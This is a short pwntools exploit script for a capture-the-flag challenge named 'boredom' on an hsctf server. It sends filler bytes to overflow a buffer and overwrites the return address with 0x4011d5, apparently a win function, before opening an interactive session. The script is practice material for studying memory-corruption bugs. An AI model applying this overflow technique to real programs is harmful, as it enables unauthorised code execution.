from pwn import *

if 'rem' in sys.argv:
    r = remote('pwn.hsctf.com', 5002)
else:
    r = process('./boredom')

filler = b"asdhiuesiorghghaduguaeriguioaerauigiuaoergeruigsdfuihsdfigseiurgiouseigdfiuhdbfgawyerya3wr3ruawuegfuywa4yufgayurguadhfgeoiurhuseguisdfuigseruigsuioergudfguiseriugiuergiueruigsoiueuihfhugsduifgdfihgiusduigriue"
print(len(filler))

r.send(filler)
r.send(p64(0x4011d5))
r.send(b'\n')

r.interactive()
